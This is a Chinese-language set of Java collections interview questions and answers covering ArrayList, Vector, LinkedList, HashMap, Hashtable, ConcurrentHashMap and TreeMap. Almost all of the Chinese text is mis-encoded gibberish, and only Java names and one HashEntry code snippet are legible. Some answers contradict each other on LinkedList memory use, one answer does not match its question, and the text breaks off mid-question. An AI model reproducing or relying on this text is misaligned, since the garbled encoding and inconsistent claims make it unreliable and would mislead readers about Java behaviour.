é˜è¿°ArrayListã€Vectorã€LinkedListçš„å­˜å‚¨æ€§èƒ½å’Œç‰¹æ€§ ArrayList å’ŒVectoréƒ½æ˜¯ä½¿ç”¨æ•°ç»„æ–¹å¼å­˜å‚¨æ•°æ®ï¼Œæ­¤æ•°ç»„å…ƒç´ æ•°å¤§äºå®é™…å­˜å‚¨çš„æ•°æ®ä»¥ä¾¿å¢åŠ å’Œæ’å…¥å…ƒç´ ï¼Œå®ƒä»¬éƒ½å…è®¸ç›´æ¥æŒ‰åºå·ç´¢å¼•å…ƒç´ ï¼Œä½†æ˜¯æ’å…¥å…ƒç´ è¦æ¶‰åŠæ•°ç»„å…ƒç´ ç§»åŠ¨ç­‰å†…å­˜æ“ä½œï¼Œæ‰€ä»¥ç´¢å¼•æ•°æ®å¿«è€Œæ’å…¥æ•°æ®æ…¢ï¼ŒVectorä¸­çš„æ–¹æ³•ç”±äºæ·»åŠ äº†synchronizedä¿®é¥°ï¼Œå› æ­¤Vectoræ˜¯çº¿ç¨‹å®‰å…¨çš„å®¹å™¨ï¼Œä½†æ€§èƒ½ä¸Šè¾ƒArrayListå·®ï¼Œå› æ­¤å·²ç»æ˜¯Javaä¸­çš„é—ç•™å®¹å™¨ã€‚ LinkedListä½¿ç”¨åŒå‘é“¾è¡¨å®ç°å­˜å‚¨ï¼ˆå°†å†…å­˜ä¸­é›¶æ•£çš„å†…å­˜å•å…ƒé€šè¿‡é™„åŠ çš„å¼•ç”¨å…³è”èµ·æ¥ï¼Œå½¢æˆä¸€ä¸ªå¯ä»¥æŒ‰åºå·ç´¢å¼•çš„çº¿æ€§ç»“æ„ï¼Œè¿™ç§é“¾å¼å­˜å‚¨æ–¹å¼ä¸æ•°ç»„çš„è¿ç»­å­˜å‚¨æ–¹å¼ç›¸æ¯”ï¼Œå†…å­˜çš„åˆ©ç”¨ç‡æ›´é«˜ï¼‰ï¼ŒæŒ‰åºå·ç´¢å¼•æ•°æ®éœ€è¦è¿›è¡Œå‰å‘æˆ–åå‘éå†ï¼Œä½†æ˜¯æ’å…¥æ•°æ®æ—¶åªéœ€è¦è®°å½•æœ¬é¡¹çš„å‰åé¡¹å³å¯ï¼Œæ‰€ä»¥æ’å…¥é€Ÿåº¦è¾ƒå¿«ã€‚Vectorå±äºé—ç•™å®¹å™¨ï¼ˆJavaæ—©æœŸçš„ç‰ˆæœ¬ä¸­æä¾›çš„å®¹å™¨ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒHashtableã€Dictionaryã€BitSetã€Stackã€Propertieséƒ½æ˜¯é—ç•™å®¹å™¨ï¼‰ï¼Œå·²ç»ä¸æ¨èä½¿ç”¨ï¼Œä½†æ˜¯ç”±äºArrayListå’ŒLinkedListedéƒ½æ˜¯éçº¿ç¨‹å®‰å…¨çš„ï¼Œå¦‚æœé‡åˆ°å¤šä¸ªçº¿ç¨‹æ“ä½œåŒä¸€ä¸ªå®¹å™¨çš„åœºæ™¯ï¼Œåˆ™å¯ä»¥é€šè¿‡å·¥å…·ç±»Collectionsä¸­çš„synchronizedListæ–¹æ³•å°†å…¶è½¬æ¢æˆçº¿ç¨‹å®‰å…¨çš„å®¹å™¨åå†ä½¿ç”¨ï¼ˆè¿™æ˜¯å¯¹è£…æ½¢æ¨¡å¼çš„åº”ç”¨ï¼Œå°†å·²æœ‰å¯¹è±¡ä¼ å…¥å¦ä¸€ä¸ªç±»çš„æ„é€ å™¨ä¸­åˆ›å»ºæ–°çš„å¯¹è±¡æ¥å¢å¼ºå®ç°ï¼‰ã€‚ åˆ¤æ–­Listã€Setã€Mapæ˜¯å¦ç»§æ‰¿è‡ªCollectionæ¥å£ï¼Ÿ Listã€Set æ˜¯ï¼ŒMap ä¸æ˜¯ã€‚ Mapæ˜¯é”®å€¼å¯¹æ˜ å°„å®¹å™¨ï¼Œä¸Listå’ŒSetæœ‰æ˜æ˜¾çš„åŒºåˆ«ï¼Œè€ŒSetå­˜å‚¨çš„é›¶æ•£çš„å…ƒç´ ä¸”ä¸å…è®¸æœ‰é‡å¤å…ƒç´  ï¼ˆæ•°å­¦ä¸­çš„é›†åˆä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼ŒListæ˜¯çº¿æ€§ç»“æ„çš„å®¹å™¨ï¼Œé€‚ç”¨äºæŒ‰æ•°å€¼ç´¢å¼•è®¿é—®å…ƒç´ çš„æƒ…å½¢ã€‚ ä½ æ‰€çŸ¥é“çš„å¸¸ç”¨é›†åˆç±»ä»¥åŠä¸»è¦æ–¹æ³•ï¼Ÿæœ€å¸¸ç”¨çš„é›†åˆç±»æ˜¯List å’Œ Mapã€‚ List çš„å…·ä½“å®ç°åŒ…æ‹¬ ArrayList å’Œ Vectorï¼Œå®ƒä»¬æ˜¯å¯å˜å¤§å°çš„åˆ—è¡¨ï¼Œæ¯”è¾ƒé€‚åˆæ„å»ºã€å­˜å‚¨å’Œæ“ä½œä»»ä½•ç±»å‹å¯¹è±¡çš„å…ƒç´ åˆ—è¡¨ã€‚List é€‚ç”¨äºæŒ‰æ•°å€¼ç´¢å¼•è®¿é—®å…ƒç´ çš„æƒ…å½¢ã€‚ Map æä¾›äº†ä¸€ä¸ªæ›´é€šç”¨çš„å…ƒç´ å­˜å‚¨æ–¹æ³•ã€‚ Map é›†åˆç±»ç”¨äºå­˜å‚¨å…ƒç´ å¯¹ï¼ˆç§°ä½œâ€é”®â€å’Œâ€å€¼â€ï¼‰ï¼Œå…¶ä¸­æ¯ä¸ªé”®æ˜ å°„åˆ°ä¸€ä¸ªå€¼ã€‚ è¯´æ˜Collection å’Œ Collectionsçš„åŒºåˆ«Collectionæ˜¯é›†åˆç±»çš„ä¸Šçº§æ¥å£ï¼Œç»§æ‰¿ä¸ä»–çš„æ¥å£ä¸»è¦æœ‰Set å’ŒList.Collectionsæ˜¯é’ˆå¯¹é›†åˆç±»çš„ä¸€ä¸ªå¸®åŠ©ç±»ï¼Œä»–æä¾›ä¸€ç³»åˆ—é™æ€æ–¹æ³•å®ç°å¯¹å„ç§é›†åˆçš„æœç´¢ã€æ’åºã€çº¿ç¨‹å®‰å…¨åŒ–ç­‰æ“ä½œã€‚ è¯´æ˜ArrayList,Vector,LinkedListçš„å­˜å‚¨æ€§èƒ½å’Œç‰¹æ€§æ˜¯ä»€ä¹ˆï¼Ÿ ArrayList å’ŒVectoréƒ½æ˜¯ä½¿ç”¨æ•°ç»„æ–¹å¼å­˜å‚¨æ•°æ®ï¼Œæ­¤æ•°ç»„å…ƒç´ æ•°å¤§äºå®é™…å­˜å‚¨çš„æ•°æ®ä»¥ä¾¿å¢åŠ å’Œæ’å…¥å…ƒç´ ï¼Œå®ƒä»¬éƒ½å…è®¸ç›´æ¥æŒ‰åºå·ç´¢å¼•å…ƒç´ ï¼Œä½†æ˜¯æ’å…¥å…ƒç´ è¦æ¶‰åŠæ•°ç»„å…ƒç´ ç§»åŠ¨ç­‰å†…å­˜æ“ä½œï¼Œæ‰€ä»¥ç´¢å¼•æ•°æ®å¿«è€Œæ’å…¥æ•°æ®æ…¢ï¼ŒVectorç”±äºä½¿ç”¨äº†synchronizedæ–¹æ³•ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰ï¼Œé€šå¸¸æ€§èƒ½ä¸Šè¾ƒArrayListå·®ï¼Œè€ŒLinkedListä½¿ç”¨åŒå‘é“¾è¡¨å®ç°å­˜å‚¨ï¼ŒæŒ‰åºå·ç´¢å¼•æ•°æ®éœ€è¦è¿›è¡Œå‰å‘æˆ–åå‘éå†ï¼Œä½†æ˜¯æ’å…¥æ•°æ®æ—¶åªéœ€è¦è®°å½•æœ¬é¡¹çš„å‰åé¡¹å³å¯ï¼Œæ‰€ä»¥æ’å…¥é€Ÿåº¦è¾ƒå¿«ã€‚ ArrayListå’ŒLinkedListçš„åŒºåˆ«ï¼Ÿ(é“¾è¡¨å’Œæ•°ç»„çš„ä¼˜ç¼ºç‚¹) ArrayListå’ŒLinkedListéƒ½å®ç°äº†Listæ¥å£ï¼Œä»–ä»¬æœ‰ä»¥ä¸‹çš„ä¸åŒç‚¹ï¼šArrayListæ˜¯åŸºäºç´¢å¼•çš„æ•°æ®æ¥å£ï¼Œå®ƒçš„åº•å±‚æ˜¯æ•°ç»„ã€‚å®ƒå¯ä»¥ä»¥O(1)æ—¶é—´å¤æ‚åº¦å¯¹å…ƒç´ è¿›è¡Œéšæœºè®¿é—®ã€‚ä¸æ­¤å¯¹åº”ï¼ŒLinkedListæ˜¯ä»¥å…ƒç´ åˆ—è¡¨çš„å½¢å¼å­˜å‚¨å®ƒçš„æ•°æ®ï¼Œæ¯ä¸€ä¸ªå…ƒç´ éƒ½å’Œå®ƒçš„å‰ä¸€ä¸ªå’Œåä¸€ä¸ªå…ƒç´ é“¾æ¥åœ¨ä¸€èµ·ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŸ¥æ‰¾æŸä¸ªå…ƒç´ çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ã€‚ç›¸å¯¹äºArrayListï¼ŒLinkedListçš„æ’å…¥ï¼Œæ·»åŠ ï¼Œåˆ é™¤æ“ä½œé€Ÿåº¦æ›´å¿«ï¼Œå› ä¸ºå½“å…ƒç´ è¢«æ·»åŠ åˆ°é›†åˆä»»æ„ä½ç½®çš„æ—¶å€™ï¼Œä¸éœ€è¦åƒæ•°ç»„é‚£æ ·é‡æ–°è®¡ç®—å¤§å°æˆ–è€…æ˜¯æ›´æ–°ç´¢å¼•ã€‚LinkedListæ¯”ArrayListæ›´å å†…å­˜ï¼Œå› ä¸ºLinkedListä¸ºæ¯ä¸€ä¸ªèŠ‚ç‚¹å­˜å‚¨äº†ä¸¤ä¸ªå¼•ç”¨ï¼Œä¸€ä¸ªæŒ‡å‘å‰ä¸€ä¸ªå…ƒç´ ï¼Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚ è¯´æ˜HashMapå’ŒHashtableçš„åŒºåˆ«ï¼ŸHashMapå’ŒHashtableéƒ½å®ç°äº†Mapæ¥å£ï¼Œå› æ­¤å¾ˆå¤šç‰¹æ€§éå¸¸ç›¸ä¼¼ã€‚ä½†æ˜¯ï¼Œä»–ä»¬æœ‰ä»¥ä¸‹ä¸åŒç‚¹ï¼šHashMapå…è®¸é”®å’Œå€¼æ˜¯nullï¼Œè€ŒHashtableä¸å…è®¸é”®æˆ–è€…å€¼æ˜¯nullã€‚Hashtableæ˜¯åŒæ­¥çš„ï¼Œè€ŒHashMapä¸æ˜¯ã€‚å› æ­¤ï¼ŒHashMapæ›´é€‚åˆäºå•çº¿ç¨‹ç¯å¢ƒï¼Œè€ŒHashtableé€‚åˆäºå¤šçº¿ç¨‹ç¯å¢ƒã€‚HashMapæä¾›äº†å¯ä¾›åº”ç”¨è¿­ä»£çš„é”®çš„é›†åˆï¼Œå› æ­¤ï¼ŒHashMapæ˜¯å¿«é€Ÿå¤±è´¥çš„ã€‚å¦ä¸€æ–¹é¢ï¼ŒHashtableæä¾›äº†å¯¹é”®çš„åˆ—ä¸¾(Enumeration)ã€‚ä¸€èˆ¬è®¤ä¸ºHashtableæ˜¯ä¸€ä¸ªé—ç•™çš„ç±»ã€‚ è¯·è¯´è¯´å¿«é€Ÿå¤±è´¥(fail-fast)å’Œå®‰å…¨å¤±è´¥(fail-safe)çš„åŒºåˆ«ï¼ŸIteratorçš„å®‰å…¨å¤±è´¥æ˜¯åŸºäºå¯¹åº•å±‚é›†åˆåšæ‹·è´ï¼Œå› æ­¤ï¼Œå®ƒä¸å—æºé›†åˆä¸Šä¿®æ”¹çš„å½±å“ã€‚java.utilåŒ…ä¸‹é¢çš„æ‰€æœ‰çš„é›†åˆç±»éƒ½æ˜¯å¿«é€Ÿå¤±è´¥çš„ï¼Œè€Œjava.util.concurrentåŒ…ä¸‹é¢çš„æ‰€æœ‰çš„ç±»éƒ½æ˜¯å®‰å…¨å¤±è´¥çš„ã€‚å¿«é€Ÿå¤±è´¥çš„è¿­ä»£å™¨ä¼šæŠ›å‡ºConcurrentModificationExceptionå¼‚å¸¸ï¼Œè€Œå®‰å…¨å¤±è´¥çš„è¿­ä»£å™¨æ°¸è¿œä¸ä¼šæŠ›å‡ºè¿™æ ·çš„å¼‚å¸¸ã€‚ è¯´è¯´Iteratorå’ŒListIteratorçš„åŒºåˆ«ï¼ŸIteratorå’ŒListIteratorçš„åŒºåˆ«æ˜¯ï¼šIteratorå¯ç”¨æ¥éå†Setå’ŒListé›†åˆï¼Œä½†æ˜¯ListIteratoråªèƒ½ç”¨æ¥éå†Listã€‚Iteratorå¯¹é›†åˆåªèƒ½æ˜¯å‰å‘éå†ï¼ŒListIteratoræ—¢å¯ä»¥å‰å‘ä¹Ÿå¯ä»¥åå‘ã€‚ListIteratorå®ç°äº†Iteratoræ¥å£ï¼Œå¹¶åŒ…å«å…¶ä»–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼šå¢åŠ å…ƒç´ ï¼Œæ›¿æ¢å…ƒç´ ï¼Œè·å–å‰ä¸€ä¸ªå’Œåä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ï¼Œç­‰ç­‰ã€‚ è¯·ç®€å•è¯´æ˜ä¸€ä¸‹ä»€ä¹ˆæ˜¯è¿­ä»£å™¨ï¼ŸIteratoræä¾›äº†ç»Ÿä¸€éå†æ“ä½œé›†åˆå…ƒç´ çš„ç»Ÿä¸€æ¥å£, Collectionæ¥å£å®ç°Iterableæ¥å£,æ¯ä¸ªé›†åˆéƒ½é€šè¿‡å®ç°Iterableæ¥å£ä¸­iterator()æ–¹æ³•è¿”å›Iteratoræ¥å£çš„å®ä¾‹, ç„¶åå¯¹é›†åˆçš„å…ƒç´ è¿›è¡Œè¿­ä»£æ“ä½œ.æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šåœ¨è¿­ä»£å…ƒç´ çš„æ—¶å€™ä¸èƒ½é€šè¿‡é›†åˆçš„æ–¹æ³•åˆ é™¤å…ƒç´ , å¦åˆ™ä¼šæŠ›å‡ºConcurrentModificationException å¼‚å¸¸. ä½†æ˜¯å¯ä»¥é€šè¿‡Iteratoræ¥å£ä¸­çš„remove()æ–¹æ³•è¿›è¡Œåˆ é™¤. è§£é‡Šä¸ºä»€ä¹ˆé›†åˆç±»æ²¡æœ‰å®ç°Cloneableå’ŒSerializableæ¥å£ï¼Ÿå…‹éš†(cloning)æˆ–è€…æ˜¯åºåˆ—åŒ–(serialization)çš„è¯­ä¹‰å’Œå«ä¹‰æ˜¯è·Ÿå…·ä½“çš„å®ç°ç›¸å…³çš„ã€‚å› æ­¤ï¼Œåº”è¯¥ç”±é›†åˆç±»çš„å…·ä½“å®ç°æ¥å†³å®šå¦‚ä½•è¢«å…‹éš†æˆ–è€…æ˜¯åºåˆ—åŒ–ã€‚å®ç°Serializableåºåˆ—åŒ–çš„ä½œç”¨ï¼šå°†å¯¹è±¡çš„çŠ¶æ€ä¿å­˜åœ¨å­˜å‚¨åª’ä½“ä¸­ä»¥ä¾¿å¯ä»¥åœ¨ä»¥åé‡å†™åˆ›å»ºå‡ºå®Œå…¨ç›¸åŒçš„å‰¯æœ¬ï¼›æŒ‰å€¼å°†å¯¹è±¡ä»ä¸€ä¸ªä»ä¸€ä¸ªåº”ç”¨ç¨‹åºåŸŸå‘å‘å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºåŸŸã€‚å®ç° Serializableæ¥å£çš„ä½œç”¨å°±æ˜¯å¯ä»¥æŠŠå¯¹è±¡å­˜åˆ°å­—èŠ‚æµï¼Œç„¶åå¯ä»¥æ¢å¤ã€‚æ‰€ä»¥ä½ æƒ³å¦‚æœä½ çš„å¯¹è±¡æ²¡æœ‰åºåˆ—åŒ–ï¼Œæ€ä¹ˆæ‰èƒ½è¿›è¡Œç½‘ç»œä¼ è¾“å‘¢ï¼Ÿè¦ç½‘ç»œä¼ è¾“å°±å¾—è½¬ä¸ºå­—èŠ‚æµï¼Œæ‰€ä»¥åœ¨åˆ†å¸ƒå¼åº”ç”¨ä¸­ï¼Œä½ å°±å¾—å®ç°åºåˆ—åŒ–ã€‚å¦‚æœä½ ä¸éœ€è¦åˆ†å¸ƒå¼åº”ç”¨ï¼Œé‚£å°±æ²¡å¿…è¦å®ç°å®ç°åºåˆ—åŒ–ã€‚ Javaé›†åˆç±»æ¡†æ¶çš„åŸºæœ¬æ¥å£æœ‰å“ªäº›ï¼Ÿé›†åˆç±»æ¥å£æŒ‡å®šäº†ä¸€ç»„å«åšå…ƒç´ çš„å¯¹è±¡ã€‚é›†åˆç±»æ¥å£çš„æ¯ä¸€ç§å…·ä½“çš„å®ç°ç±»éƒ½å¯ä»¥é€‰æ‹©ä»¥å®ƒè‡ªå·±çš„æ–¹å¼å¯¹å…ƒç´ è¿›è¡Œä¿å­˜å’Œæ’åºã€‚æœ‰çš„é›†åˆç±»å…è®¸é‡å¤çš„é”®ï¼Œæœ‰äº›ä¸å…è®¸ã€‚Javaé›†åˆç±»æä¾›äº†ä¸€å¥—è®¾è®¡è‰¯å¥½çš„æ”¯æŒå¯¹ä¸€ç»„å¯¹è±¡è¿›è¡Œæ“ä½œçš„æ¥å£å’Œç±»ã€‚Javaé›†åˆç±»é‡Œé¢æœ€åŸºæœ¬çš„æ¥å£æœ‰ï¼šCollectionï¼šä»£è¡¨ä¸€ç»„å¯¹è±¡ï¼Œæ¯ä¸€ä¸ªå¯¹è±¡éƒ½æ˜¯å®ƒçš„å­å…ƒç´ ã€‚Setï¼šä¸åŒ…å«é‡å¤å…ƒç´ çš„Collectionã€‚Listï¼šæœ‰é¡ºåºçš„collectionï¼Œå¹¶ä¸”å¯ä»¥åŒ…å«é‡å¤å…ƒç´ ã€‚Mapï¼šå¯ä»¥æŠŠé”®(key)æ˜ å°„åˆ°å€¼(value)çš„å¯¹è±¡ï¼Œé”®ä¸èƒ½é‡å¤ã€‚ ConcurrentHashMapçš„åŸç†ï¼Ÿ ConcurrentHashMap ç±»ä¸­åŒ…å«ä¸¤ä¸ªé™æ€å†…éƒ¨ç±» HashEntry å’Œ Segmentã€‚ HashEntry ç”¨æ¥å°è£…æ˜ å°„è¡¨çš„é”® / å€¼å¯¹ï¼› Segment ç”¨æ¥å……å½“é”çš„è§’è‰²ï¼Œæ¯ä¸ª Segment å¯¹è±¡å®ˆæŠ¤æ•´ä¸ªæ•£åˆ—æ˜ å°„è¡¨çš„è‹¥å¹²ä¸ªæ¡¶ã€‚æ¯ä¸ªæ¡¶æ˜¯ç”±è‹¥å¹²ä¸ª HashEntry å¯¹è±¡é“¾æ¥èµ·æ¥çš„é“¾è¡¨ã€‚ ä¸€ä¸ª ConcurrentHashMap å®ä¾‹ä¸­åŒ…å«ç”±è‹¥å¹²ä¸ª Segment å¯¹è±¡ç»„æˆçš„æ•°ç»„ã€‚HashEntry ç”¨æ¥å°è£…æ•£åˆ—æ˜ å°„è¡¨ä¸­çš„é”®å€¼å¯¹ã€‚åœ¨ HashEntry ç±»ä¸­ï¼Œkeyï¼Œhash å’Œ next åŸŸéƒ½è¢«å£°æ˜ä¸º final å‹ï¼Œvalue åŸŸè¢«å£°æ˜ä¸º volatile å‹ã€‚ static final class HashEntry&lt;K,V&gt; { final K key; // å£°æ˜ key ä¸º final å‹ final int hash; // å£°æ˜ hash å€¼ä¸º final å‹ volatile V value; // å£°æ˜ value ä¸º volatile å‹ final HashEntry&lt;K,V&gt; next; // å£°æ˜ next ä¸º final å‹ HashEntry(K key, int hash, HashEntry&lt;K,V&gt; next, V value) { this.key = key; this.hash = hash; this.next = next; this.value = value; } } åœ¨ConcurrentHashMap ä¸­ï¼Œåœ¨æ•£åˆ—æ—¶å¦‚æœäº§ç”Ÿâ€œç¢°æ’â€ï¼Œå°†é‡‡ç”¨â€œåˆ†ç¦»é“¾æ¥æ³•â€æ¥å¤„ç†â€œç¢°æ’â€ï¼šæŠŠâ€œç¢°æ’â€çš„ HashEntry å¯¹è±¡é“¾æ¥æˆä¸€ä¸ªé“¾è¡¨ã€‚ç”±äº HashEntry çš„ next åŸŸä¸º final å‹ï¼Œæ‰€ä»¥æ–°èŠ‚ç‚¹åªèƒ½åœ¨é“¾è¡¨çš„è¡¨å¤´å¤„æ’å…¥ã€‚ ä¸‹å›¾æ˜¯åœ¨ä¸€ä¸ªç©ºæ¡¶ä¸­ä¾æ¬¡æ’å…¥ Aï¼ŒBï¼ŒC ä¸‰ä¸ª HashEntry å¯¹è±¡åçš„ç»“æ„å›¾ï¼š æ’å…¥ä¸‰ä¸ªèŠ‚ç‚¹åæ¡¶çš„ç»“æ„ç¤ºæ„å›¾ï¼š æ³¨æ„ï¼šç”±äºåªèƒ½åœ¨è¡¨å¤´æ’å…¥ï¼Œæ‰€ä»¥é“¾è¡¨ä¸­èŠ‚ç‚¹çš„é¡ºåºå’Œæ’å…¥çš„é¡ºåºç›¸åã€‚ Segment ç±»ç»§æ‰¿äº ReentrantLock ç±»ï¼Œä»è€Œä½¿å¾— Segment å¯¹è±¡èƒ½å……å½“é”çš„è§’è‰²ã€‚æ¯ä¸ª Segment å¯¹è±¡ç”¨æ¥å®ˆæŠ¤å…¶ï¼ˆæˆå‘˜å¯¹è±¡ table ä¸­ï¼‰åŒ…å«çš„è‹¥å¹²ä¸ªæ¡¶ã€‚ è§£é‡Šä¸€ä¸‹TreeMap?TreeMapæ˜¯ä¸€ä¸ªæœ‰åºçš„key-valueé›†åˆï¼ŒåŸºäºçº¢é»‘æ ‘ï¼ˆRed-Black treeï¼‰çš„ NavigableMapå®ç°ã€‚è¯¥æ˜ å°„æ ¹æ®å…¶é”®çš„è‡ªç„¶é¡ºåºè¿›è¡Œæ’åºï¼Œæˆ–è€…æ ¹æ®åˆ›å»ºæ˜ å°„æ—¶æä¾›çš„ Comparatorè¿›è¡Œæ’åºï¼Œå…·ä½“å–å†³äºä½¿ç”¨çš„æ„é€ æ–¹æ³•ã€‚TreeMapçš„ç‰¹æ€§ï¼šæ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²æ¯ä¸ªèŠ‚ç‚¹éƒ½åªèƒ½æ˜¯çº¢è‰²æˆ–è€…é»‘è‰²æ¯ä¸ªå¶èŠ‚ç‚¹ï¼ˆNILèŠ‚ç‚¹ï¼Œç©ºèŠ‚ç‚¹ï¼‰æ˜¯é»‘è‰²çš„ã€‚å¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ˜¯çº¢è‰²çš„ï¼Œåˆ™å®ƒä¸¤ä¸ªå­èŠ‚ç‚¹éƒ½æ˜¯é»‘è‰²çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ä¸€æ¡è·¯å¾„ä¸Šä¸èƒ½å‡ºç°ä¸¤ä¸ªçº¢è‰²çš„èŠ‚ç‚¹ã€‚ä»ä»»ä¸€èŠ‚ç‚¹åˆ°å…¶æ¯ä¸ªå¶å­çš„æ‰€æœ‰è·¯å¾„éƒ½åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²èŠ‚ç‚¹ã€‚ è¯·è¯´æ˜ArrayListæ˜¯å¦ä¼šè¶Šç•Œï¼ŸArrayListæ˜¯å®ç°äº†åŸºäºåŠ¨æ€æ•°ç»„çš„æ•°æ®ç»“æ„ï¼Œè€ŒLinkedListæ˜¯åŸºäºé“¾è¡¨çš„æ•°æ®ç»“æ„2. å¯¹äºéšæœºè®¿é—®getå’Œsetï¼ŒArrayListè¦ä¼˜äºLinkedListï¼Œå› ä¸ºLinkedListè¦ç§»åŠ¨æŒ‡é’ˆï¼›ArrayListå¹¶å‘add()å¯èƒ½å‡ºç°æ•°ç»„ä¸‹æ ‡è¶Šç•Œå¼‚å¸¸ã€‚ è¯´æ˜concurrenthashmapæœ‰ä»€ä¹ˆä¼˜åŠ¿ä»¥åŠ1.7å’Œ1.8åŒºåˆ«ï¼ŸConcurrenthashmapçº¿ç¨‹å®‰å…¨çš„ï¼Œ1.7æ˜¯åœ¨jdk1.7ä¸­é‡‡ç”¨Segment + HashEntryçš„æ–¹å¼è¿›è¡Œå®ç°çš„ï¼ŒlockåŠ åœ¨Segmentä¸Šé¢ã€‚1.7sizeè®¡ç®—æ˜¯å…ˆé‡‡ç”¨ä¸åŠ é”çš„æ–¹å¼ï¼Œè¿ç»­è®¡ç®—å…ƒç´ çš„ä¸ªæ•°ï¼Œæœ€å¤šè®¡ç®—3æ¬¡ï¼š1ã€å¦‚æœå‰åä¸¤æ¬¡è®¡ç®—ç»“æœç›¸åŒï¼Œåˆ™è¯´æ˜è®¡ç®—å‡ºæ¥çš„å…ƒç´ ä¸ªæ•°æ˜¯å‡†ç¡®çš„ï¼›2ã€å¦‚æœå‰åä¸¤æ¬¡è®¡ç®—ç»“æœéƒ½ä¸åŒï¼Œåˆ™ç»™æ¯ä¸ªSegmentè¿›è¡ŒåŠ é”ï¼Œå†è®¡ç®—ä¸€æ¬¡å…ƒç´ çš„ä¸ªæ•°ï¼› 1.8ä¸­æ”¾å¼ƒäº†Segmentè‡ƒè‚¿çš„è®¾è®¡ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯é‡‡ç”¨Node + CAS + Synchronizedæ¥ä¿è¯å¹¶å‘å®‰å…¨è¿›è¡Œå®ç°ï¼Œ1.8ä¸­ä½¿ç”¨ä¸€ä¸ªvolatileç±»å‹çš„å˜é‡baseCountè®°å½•å…ƒç´ çš„ä¸ªæ•°ï¼Œå½“æ’å…¥æ–°æ•°æ®æˆ–åˆ™åˆ é™¤æ•°æ®æ—¶ï¼Œä¼šé€šè¿‡addCount()æ–¹æ³•æ›´æ–°baseCountï¼Œé€šè¿‡ç´¯åŠ baseCountå’ŒCounterCellæ•°ç»„ä¸­çš„æ•°é‡ï¼Œå³å¯å¾—åˆ°å…ƒç´ çš„æ€»ä¸ªæ•°ï¼› TreeMapçš„åº•å±‚å®ç°ï¼ŸTreeMap çš„å®ç°å°±æ˜¯çº¢é»‘æ ‘æ•°æ®ç»“æ„ï¼Œä¹Ÿå°±è¯´æ˜¯ä¸€æ£µè‡ªå¹³è¡¡çš„æ’åºäºŒå‰æ ‘ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯å½“éœ€è¦å¿«é€Ÿæ£€ç´¢æŒ‡å®šèŠ‚ç‚¹ã€‚ çº¢é»‘æ ‘çš„æ’å…¥ã€åˆ é™¤ã€éå†æ—¶é—´å¤æ‚åº¦éƒ½ä¸ºO(lgN)ï¼Œæ‰€ä»¥æ€§èƒ½ä¸Šä½äºå“ˆå¸Œè¡¨ã€‚ä½†æ˜¯å“ˆå¸Œè¡¨æ— æ³•æä¾›é”®å€¼å¯¹çš„æœ‰åºè¾“å‡ºï¼Œçº¢é»‘æ ‘å› ä¸ºæ˜¯æ’åºæ’å…¥çš„ï¼Œå¯ä»¥æŒ‰ç…§é”®çš„å€¼çš„å¤§å°æœ‰åºè¾“å‡ºã€‚çº¢é»‘æ ‘æ€§è´¨ï¼š æ€§è´¨1ï¼šæ¯ä¸ªèŠ‚ç‚¹è¦ä¹ˆæ˜¯çº¢è‰²ï¼Œè¦ä¹ˆæ˜¯é»‘è‰²ã€‚ æ€§è´¨2ï¼šæ ¹èŠ‚ç‚¹æ°¸è¿œæ˜¯é»‘è‰²çš„ã€‚ æ€§è´¨3ï¼šæ‰€æœ‰çš„å¶èŠ‚ç‚¹éƒ½æ˜¯ç©ºèŠ‚ç‚¹ï¼ˆå³ nullï¼‰ï¼Œå¹¶ä¸”æ˜¯é»‘è‰²çš„ã€‚ æ€§è´¨4ï¼šæ¯ä¸ªçº¢è‰²èŠ‚ç‚¹çš„ä¸¤ä¸ªå­èŠ‚ç‚¹éƒ½æ˜¯é»‘è‰²ã€‚ï¼ˆä»æ¯ä¸ªå¶å­åˆ°æ ¹çš„è·¯å¾„ä¸Šä¸ä¼šæœ‰ä¸¤ä¸ªè¿ç»­çš„çº¢è‰²èŠ‚ç‚¹ï¼‰ æ€§è´¨5ï¼šä»ä»»ä¸€èŠ‚ç‚¹åˆ°å…¶å­æ ‘ä¸­æ¯ä¸ªå¶å­èŠ‚ç‚¹çš„è·¯å¾„éƒ½åŒ…å«ç›¸åŒæ•°é‡çš„é»‘è‰²èŠ‚ç‚¹ã€‚ è¯´æ˜ConcurrentHashMapé”åŠ åœ¨äº†å“ªäº›åœ°æ–¹ï¼ŸåŠ åœ¨æ¯ä¸ªSegment ä¸Šé¢ã€‚ è§£é‡ŠHashMapçš„å®¹é‡ä¸ºä»€ä¹ˆæ˜¯2çš„næ¬¡å¹‚ï¼Ÿè´Ÿè½½å› å­é»˜è®¤æ˜¯0.75ï¼Œ 2^næ˜¯ä¸ºäº†è®©æ•£åˆ—æ›´åŠ å‡åŒ€ï¼Œä¾‹å¦‚å‡ºç°æç«¯æƒ…å†µéƒ½æ•£åˆ—åœ¨æ•°ç»„ä¸­çš„ä¸€ä¸ªä¸‹æ ‡ï¼Œé‚£ä¹ˆhashmapä¼šç”±Oï¼ˆ1ï¼‰å¤æ‚é€€åŒ–ä¸ºOï¼ˆnï¼‰çš„ã€‚ è¯·ä½ ç®€å•ä»‹ç»ä¸€ä¸‹ArrayListå’ŒLinkedListçš„åŒºåˆ«ï¼Œå¹¶è¯´æ˜å¦‚æœä¸€ç›´åœ¨listçš„å°¾éƒ¨æ·»åŠ å…ƒç´ 